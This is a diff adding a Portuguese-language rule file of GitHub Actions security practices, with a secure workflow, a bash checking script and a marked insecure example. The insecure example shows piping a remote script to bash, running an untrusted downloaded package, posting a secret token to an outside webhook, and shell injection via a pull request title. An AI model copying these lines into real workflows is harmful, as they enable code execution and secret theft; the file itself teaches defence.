@@ -1,0 +1,236 @@
+---
+description: Esta regra define melhores práticas de segurança para workflows do GitHub Actions. Deve ser aplicada sempre que: (1) Configurando novos workflows, (2) Auditando workflows existentes para vulnerabilidades, (3) Implementando automação que envolve segredos ou permissões elevadas, (4) Configurando deploys para ambientes de produção. A regra garante que os workflows do GitHub Actions sejam configurados de maneira segura, minimizando riscos de vazamento de credenciais e ataques à cadeia de suprimentos.
+globs: 
+alwaysApply: false
+---
+
+# Segurança em GitHub Actions
+
+## Regras Críticas
+
+### Gerenciamento de Segredos
+- **NUNCA** armazenar credenciais, tokens, chaves SSH ou outros segredos diretamente no código
+- **SEMPRE** utilizar GitHub Secrets para armazenar informações sensíveis
+- Limitar o escopo de acesso dos tokens ao mínimo necessário (principle of least privilege)
+- Rotacionar secrets regularmente, especialmente após saída de membros da equipe
+- Evitar expor secrets em logs de debug ou outputs de steps
+
+### Permissões de Workflow
+- Configurar explicitamente o escopo de permissões para cada workflow usando o bloco `permissions`
+- Restringir permissões ao mínimo necessário (ex: read-only para `contents` quando possível)
+- Revisar cuidadosamente workflows que precisam de permissões de escrita ou admin
+- Usar o modelo de permissões restritivas por padrão: `permissions: {}`
+
+### Segurança de Dependências
+- Fixar versões de actions usando hash SHA completo (não usar tags ou branches)
+- Preferir actions oficiais e bem mantidas do GitHub ou de fornecedores confiáveis
+- Implementar verificação de vulnerabilidades para dependências do projeto
+- Verificar a integridade de pacotes baixados usando checksums quando possível
+
+### Prevenção de Injeção de Comandos
+- Evitar o uso direto de inputs não sanitizados em comandos shell
+- Utilizar mecanismos de escape adequados para inputs externos
+- Verificar e validar todos os inputs de usuário antes de utilizá-los em comandos
+- Isolar operações que exigem entradas externas em containers restritos
+
+### Ambientes Protegidos
+- Utilizar environments do GitHub para deploys em produção e ambientes sensíveis
+- Configurar revisores obrigatórios para aprovação de deploys em ambientes críticos
+- Implementar regras de proteção de branches para controlar quais workflows podem ser executados
+- Utilizar tempos de expiração para ambientes de produção (wait timer)
+
+### Validação de Código e Revisão
+- Exigir testes de segurança estáticos (SAST) antes de merge em branches protegidas
+- Implementar revisão de código obrigatória para mudanças em workflows
+- Validar checksums/assinaturas de artefatos antes de deploy
+- Utilizar dependabot para manter dependências e actions atualizadas
+
+### Runners Seguros
+- Usar runners efêmeros (self-hosted runners em infraestrutura temporária) para tarefas sensíveis 
+- Isolar runners por ambiente (não compartilhar runners entre ambientes de produção e não-produção)
+- Aplicar patches de segurança regularmente em runners autogerenciados
+- Não permitir acesso de escrita entre runners de diferentes níveis de confiança
+
+### Monitoramento e Auditoria
+- Habilitar notificações para alterações em workflows e secrets
+- Configurar alertas para falhas de segurança em execuções de workflow
+- Manter logs de execução de workflow por períodos adequados para auditoria
+- Revisar regularmente permissões e acessos de colaboradores
+
+## Exemplos
+
+<example>
+# Configuração segura de GitHub Actions
+
+# Exemplo 1: Workflow com permissões explícitas e limitadas
+name: Secure Deployment
+
+# Permissões limitadas ao mínimo necessário
+permissions:
+  contents: read
+  deployments: write
+  id-token: write # Necessário para autenticação OIDC
+
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  deploy:
+    name: Deploy to Production
+    runs-on: ubuntu-latest
+    # Ambiente protegido com aprovadores obrigatórios
+    environment:
+      name: production
+      url: https://example.com
+    
+    steps:
+    # Fixar versão da action usando hash SHA
+    - uses: actions/checkout@a12a3943b4bdde767164f792f33f40b04645d846 # v4.0.0
+    
+    # Implementar verificação de vulnerabilidades
+    - name: Security scan
+      uses: aquasecurity/trivy-action@2a2157eb22c08c9a1fac99263430307b8d1bc1f1 # v0.11.2
+      with:
+        scan-type: 'fs'
+        ignore-unfixed: true
+        format: 'table'
+        severity: 'CRITICAL,HIGH'
+    
+    # Usar GitHub OIDC para autenticação sem armazenar credenciais longas
+    - name: Configure AWS credentials
+      uses: aws-actions/configure-aws-credentials@010d0da01d0b5a38af31e9c3470dbfdabdecca3a # v4.0.1
+      with:
+        role-to-assume: ${{ secrets.AWS_ROLE_TO_ASSUME }}
+        aws-region: us-east-1
+        role-session-name: GithubActionsSession
+    
+    # Validação de inputs antes de uso
+    - name: Deploy
+      run: |
+        # Validar input antes de uso
+        if [[ ! "${{ github.ref }}" =~ ^refs/heads/(main|master)$ ]]; then
+          echo "Deployment só permitido de branches principais"
+          exit 1
+        fi
+        
+        # Usar arquivo de configuração verificado do repositório
+        aws s3 sync ./dist s3://production-bucket/ --delete
+
+# Exemplo 2: Script de validação de segurança de workflows
+
+#!/bin/bash
+# security-check.sh - Verificação de segurança para GitHub Actions
+
+check_workflow_security() {
+  local file=$1
+  local issues=0
+  
+  echo "Verificando $file..."
+  
+  # Verificar se há tokens ou credenciais hardcoded
+  if grep -E "token|password|secret|key" --include="*.yml" --include="*.yaml" -r .github/workflows/; then
+    echo "⚠️ ALERTA: Possíveis credenciais ou tokens no arquivo de workflow!"
+    ((issues++))
+  fi
+  
+  # Verificar permissions
+  if ! grep -q "permissions:" "$file"; then
+    echo "⚠️ ALERTA: Permissões não explicitamente definidas!"
+    ((issues++))
+  fi
+  
+  # Verificar se usa actions com versões fixas por hash
+  if grep -E "uses:.*@[^0-9a-f]" "$file"; then
+    echo "⚠️ ALERTA: Actions sem hash SHA para versão fixa!"
+    ((issues++))
+  fi
+  
+  # Verificar se há scripts com inputs não sanitizados
+  if grep -E 'run:.*\${{ github.event' "$file"; then
+    echo "⚠️ ATENÇÃO: Possível uso de inputs não sanitizados em comandos shell!"
+    ((issues++))
+  fi
+  
+  # Verificar se há pull_request_target com permissões perigosas
+  if grep -q "pull_request_target" "$file" && grep -q "permissions:" "$file" && ! grep -q "permissions: {}" "$file"; then
+    echo "⚠️ ALERTA: Workflow usa pull_request_target sem restringir permissões!"
+    ((issues++))
+  fi
+  
+  if [ $issues -eq 0 ]; then
+    echo "✅ Nenhum problema de segurança óbvio encontrado em $file"
+  else
+    echo "❌ Encontrados $issues possíveis problemas de segurança em $file"
+  fi
+  
+  return $issues
+}
+
+# Verificar todos os workflows
+find .github/workflows -name "*.yml" -o -name "*.yaml" | while read workflow; do
+  check_workflow_security "$workflow"
+done
+</example>
+
+<example type="invalid">
+# Workflow com problemas graves de segurança
+
+name: Insecure Deployment
+
+on:
+  pull_request_target:  # ❌ Perigoso sem restrições de permissões
+
+# ❌ Sem declaração explícita de permissões
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    
+    steps:
+    # ❌ Usa versão flutuante da action
+    - uses: actions/checkout@v4
+    
+    # ❌ Credenciais hardcoded no workflow
+    - name: Configure AWS
+      run: |
+        aws configure set aws_access_key_id "AKIAIOSFODNN7EXAMPLE"
+        aws configure set aws_secret_access_key "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+        aws configure set region us-east-1
+    
+    # ❌ Input não sanitizado usado diretamente em comando shell
+    - name: Execute script
+      run: |
+        chmod +x ./scripts/deploy.sh
+        ./scripts/deploy.sh ${{ github.event.pull_request.title }}
+    
+    # ❌ Permissões excessivas para token
+    - name: Create release
+      uses: actions/create-release@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}  # Token com permissões implícitas excessivas
+    
+    # ❌ Baixa e executa script da internet sem verificação
+    - name: Run remote script
+      run: curl -s https://example.com/remote-script.sh | bash
+    
+    # ❌ Extrai zip potencialmente malicioso sem verificação
+    - name: Extract dependencies
+      run: |
+        curl -sL https://untrusted-source.com/package.zip -o package.zip
+        unzip package.zip
+        ./package/setup.sh
+        
+    # ❌ Envia segredo para serviço externo sem necessidade
+    - name: Notify service
+      run: |
+        curl -X POST https://webhook.example.com \
+        -H "Content-Type: application/json" \
+        -d '{"token": "${{ secrets.API_TOKEN }}", "message": "Deployed"}'
+        
+    # ❌ Exporta variável de ambiente com segredo
+    - name: Export env vars
+      run: |
+        echo "DEPLOY_TOKEN=${{ secrets.DEPLOY_TOKEN }}" >> $GITHUB_ENV
+        echo "DB_PASSWORD=${{ secrets.DB_PASSWORD }}" >> $GITHUB_ENV
+</example> 
